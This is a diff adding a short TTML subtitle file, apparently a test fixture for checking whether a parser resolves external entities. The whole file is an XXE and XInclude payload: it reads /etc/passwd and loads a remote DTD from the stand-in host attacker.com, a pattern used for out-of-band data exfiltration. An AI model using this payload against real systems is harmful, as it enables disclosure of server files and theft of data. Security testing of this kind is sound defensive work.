@@ -1,0 +1,17 @@
+<?xml version="1.0"?>
+<!DOCTYPE tt [
+  <!ENTITY xxe1 SYSTEM "http://attacker.com/test">
+  <!ENTITY xxe2 SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<tt xmlns="http://www.w3.org/ns/ttml"
+    xmlns:xi="http://www.w3.org/2001/XInclude">
+  <body>
+    <div>
+      <p begin="00:00:01.000" end="00:00:02.000">&xxe1;</p>
+      <p begin="00:00:03.000" end="00:00:04.000">&xxe2;</p>
+      <xi:include href="file:///etc/passwd" parse="text"/>
+    </div>
+  </body>
+</tt>
